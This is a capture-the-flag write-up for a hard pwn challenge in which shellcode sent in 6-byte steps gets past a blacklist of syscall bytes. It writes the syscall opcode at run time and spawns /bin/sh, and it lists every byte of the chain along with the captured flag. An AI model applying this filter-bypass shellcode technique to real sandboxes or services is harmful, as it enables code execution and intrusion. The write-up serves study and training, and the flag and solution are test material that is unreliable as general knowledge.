# stepper

> Pwn · Hard · Iulian Schifirnet  
> Points: 609 · Flag submitted by: secretNinja

**The flag**

`CSCTF{oksnCvGpuhCWPIbyqs7zACHI}`

**Challenge**

> A constrained execution bay the Ash Army used to vet captured payloads before trusting them. Your code runs
> one tiny step at a time; the registers carry over between steps, the instruction slot does not, and a short
> list of bytes is turned away at the door. Smuggle a working payload past the gate one step at a time, then
> let it run.

A TCP service (one container per team) at `<instance>`. The handout `stepper.tar.gz` contains the full
source `stepper.c` and the binary `stepper` (ELF64 x86-64 PIE, not stripped;
`-O0 -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now`). The solve was accepted about 27 minutes
after Wave 2 opened.

Tools used: pwntools (its assembler) for the shellcode. Everything else came from reading `stepper.c`.

**Approach / walkthrough**

How the bay works, from `stepper.c`:

- `main` maps one **RWX** page `code` (filled with `0xf4` `hlt`) and one RW guest-stack page.
- The slot layout is `[8 bytes of player code][ff 25 00 00 00 00 = jmp [rip+0]][&guest_exit]`, occupying
  `code[0x00..0x15]`.
- Up to `MAX_STEPS = 12` steps. Each step reads a decimal length (`STEP_SIZE = 6`; >6 is fatal, ≤0 ends the
  loop) then exactly that many raw bytes.
- Every byte is checked against a ban list: `0x0f`, `0x05`, `0x34`, `0xcd` — the bytes of `syscall`
  (`0f 05`), `sysenter` (`0f 34`) and `int` (`cd`), so no syscall instruction can be sent directly.
- Before each step only `code[0:8]` is reset to `0x90` (`nop`) and the chunk copied in. `run_step` loads the
  guest register file `ctx[16]` (RSP included) and jumps into the slot; the trailing `jmp [rip+0]` lands in
  `guest_exit`, which saves every register back to `ctx`.

So what carries over is the **registers** (all 16 GPRs incl. RSP) and **everything in the RWX page outside
`code[0:8]`**. That second point is the weakness: the service says the instruction slot does not survive, but
nothing else in the page is ever reset.

**Key insight.** The ban list applies only to bytes we transmit, not to bytes the guest writes at run time.
Build `0x050f` in a register from allowed bytes, store it at a page offset that is never cleared (and past
the trampoline), and on the last step jump there — running a `syscall` that was never sent over the wire.

Constraints that shape the chain:

1. **No known address** (PIE + mmap). `call $+5; pop rbx` (`e8 00 00 00 00 5b`) is exactly 6 bytes and
   leaves `rbx = code+5`. RBX persists and becomes the base pointer.
2. **Target offset.** `code+5+0x1b = code+0x20`, past the 8-byte slot (`0x00–0x07`), the `jmp [rip+0]`
   (`0x08–0x0d`) and the `&guest_exit` (`0x0e–0x15`) — so neither cleared nor clobbered; `0x1b` is not a
   banned byte.
3. **Making `0x050f` without `0f`/`05`:** `mov ax,0x040e` then `add ax,0x0101`.
4. **Six bytes per step** limits each step to one or two short instructions, so `/bin//sh` is built in
   32-bit halves and combined.

The chain, 11 of the 12 steps (from `solve.py`; every chunk asserted 1–6 bytes, no banned byte):

| # | Bytes | Disassembly | Purpose |
|---|-------|-------------|---------|
| 1 | `e8 00 00 00 00 5b` | `call 5 ; pop rbx` | `rbx = code+5` (position leak) |
| 2 | `31 c0 66 b8 0e 04` | `xor eax,eax ; mov ax,0x40e` | |
| 3 | `66 81 c0 01 01` | `add ax,0x101` | `ax = 0x050f` |
| 4 | `66 89 43 1b` | `mov word [rbx+0x1b], ax` | writes `0f 05` (`syscall`) at `code+0x20` |
| 5 | `b8 2f 62 69 6e` | `mov eax,0x6e69622f` | `"/bin"` |
| 6 | `b9 2f 2f 73 68` | `mov ecx,0x68732f2f` | `"//sh"` |
| 7 | `48 c1 e1 20` | `shl rcx,0x20` | |
| 8 | `48 09 c8 50` | `or rax,rcx ; push rax` | `"/bin//sh"` on the guest stack |
| 9 | `48 89 e7 31 f6` | `mov rdi,rsp ; xor esi,esi` | `rdi = path`, argv = NULL |
| 10 | `31 d2 31 c0 b0 3b` | `xor edx,edx ; xor eax,eax ; mov al,0x3b` | envp = NULL, `rax = 59` (execve) |
| 11 | `48 83 c3 1b ff e3` | `add rbx,0x1b ; jmp rbx` | jump to `code+0x20`, runs `syscall` |

Step by step: step 1 pins a base register despite PIE (`call` pushes the return address `code+5`, `pop rbx`
takes it). Steps 2–4 synthesize the `syscall` opcode in a register and store it past the trampoline, so the
banned bytes only ever exist in the page, never on the wire. Steps 5–8 assemble the little-endian
`0x68732f2f6e69622f` (`"/bin//sh"`) across RAX/RCX and push it. Steps 9–10 set up `execve`'s three
arguments. Step 11 adds `0x1b` to the base and jumps to `code+0x20`, executing the planted `syscall`.

Why the remaining details hold:

- The guest stack is a fresh zero-filled mapping. In step 8 `push rax` writes to `rsp-8` (the same word
  step 1's `call`/`pop` used); the qword at the original RSP is still zero and terminates the string.
- Step 5's `mov eax, imm32` zero-extends into RAX, so step 8's `or` yields exactly
  `0x68732f2f6e69622f` (little-endian `"/bin//sh"`).
- Linux accepts `execve(path, NULL, NULL)`. After a successful `execve` the trampoline never runs again; the
  process image is `/bin/sh`, reading from the same socket.

The service protocol is `length> ` → decimal length + `\n` → `code> ` → raw bytes, repeated per step. After
step 11 the exploit sends `cat /flag /flag.txt ./flag ./flag.txt 2>/dev/null` and the shell prints the flag.

**Why it works**

The filter checks only the bytes we send, not the bytes that end up executing, and the page is writable and
executable. The sandbox resets only the instruction slot, not the registers or the rest of the page, so a
program can be spread over many steps; self-modifying code assembled from arithmetic on allowed bytes defeats
any opcode-byte blacklist. The only "leak" needed is `call $+5; pop rbx`, which turns PIE's unknown base into
a known one relative to `code`.

**Validation / reproduction**

Each chunk was checked offline against the service's length limit and byte blacklist before sending (the
script asserts 1–6 bytes and no banned byte per step). The shipped binary could not be run locally — Docker
Desktop's x86 emulation crashed on its guest-stack switch before `main` — so the chain was verified
statically against the source (filter, lengths, slot layout), and the Capstone disassembly above was
re-checked while writing up. It then ran once against the assigned instance and got a shell. The flag went in
once through `ctf.submit.guarded_submit` and was accepted (one attempt, `correct`).

Reproduce:

```bash
STEPPER_HOST=<instance-host> STEPPER_PORT=<instance-port> \
  .venv/bin/python workspace/9140-stepper/solve.py
```

Without `STEPPER_HOST` the script falls back to `process(["/chal/stepper"])` and checks for an
`echo STEPPER_SHELL_OK` marker; that local mode is meant to run only inside the Docker sandbox.
